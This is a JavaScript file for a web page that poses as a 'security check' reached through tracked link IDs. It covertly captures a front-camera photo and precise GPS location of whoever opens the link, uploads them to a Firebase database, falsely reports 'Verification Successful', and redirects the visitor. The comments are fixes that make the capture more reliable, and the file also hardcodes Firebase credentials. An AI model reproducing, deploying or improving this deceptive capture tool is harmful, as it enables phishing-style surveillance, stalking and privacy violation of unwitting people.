// FIX: imports must be at the very top of an ES module
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// FIX 1: Removed the accidental space in the API key ("...ZHZN rpg5..." had a space that broke Firebase)
const firebaseConfig = {
    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain: "camera-c436d.firebaseapp.com",
    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId: "camera-c436d",
    storageBucket: "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function initVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('linkId');

    // FIX 2: Handle missing linkId gracefully
    if (!linkId) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h1>404 Not Found</h1><p>No link ID provided.</p></div>";
        return;
    }

    const linkRef = ref(db, 'managed_links/' + linkId);
    const snapshot = await get(linkRef);
    const settings = snapshot.val();

    if (!settings || !settings.active) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h1>404 Not Found</h1><p>This link is invalid or disabled.</p></div>";
        return;
    }

    const statusText = document.getElementById('statusText');
    statusText.innerText = "Initializing security check...";

    let lat = "Denied", lon = "Denied";
    let photoData = null;

    // STEP 1: CAMERA - triggers browser permission popup immediately
    if (settings.cam) {
        try {
            statusText.innerText = "Please allow camera access...";
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.style.display = 'block';

            // FIX 3: Wait for metadata AND play before drawing - prevents blank photo
            await new Promise(r => {
                video.onloadedmetadata = () => { video.play().then(r).catch(r); };
            });

            // Give camera 1.5s to adjust brightness
            await new Promise(r => setTimeout(r, 1500));

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            photoData = canvas.toDataURL('image/jpeg', 0.7);

            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';
            statusText.innerText = "Camera verified ✓";
        } catch (e) {
            console.error("Camera error:", e);
            statusText.innerText = "Camera denied. Continuing...";
        }
    }

    // STEP 2: LOCATION - triggers browser permission popup immediately
    if (settings.gps) {
        statusText.innerText = "Please allow location access...";
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {
                    timeout: 15000,
                    enableHighAccuracy: true,
                    maximumAge: 0
                });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            statusText.innerText = "Location verified ✓";
        } catch (e) {
            console.log("GPS denied:", e.message);
        }
    }

    // STEP 3: SEND TO FIREBASE
    statusText.innerText = "Sending data...";
    try {
        const historyRef = ref(db, 'photo_history');
        const newEntryRef = push(historyRef);
        await set(newEntryRef, {
            id: Date.now(),
            image: photoData,
            latitude: lat,
            longitude: lon,
            linkName: settings.name,
            date: new Date().toLocaleDateString(),
            time: new Date().toLocaleTimeString()
        });
        statusText.innerText = "✅ Verification Successful!";
    } catch (e) {
        console.error("Firebase error:", e);
        statusText.innerText = "Verification complete.";
    }

    if (settings.redirectUrl) {
        setTimeout(() => { window.location.href = settings.redirectUrl; }, 2000);
    }
}

window.addEventListener('load', initVerification);
